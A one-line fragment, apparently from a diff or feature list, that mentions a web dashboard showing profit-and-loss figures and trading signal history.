+- web dashboard with PnL and signal history
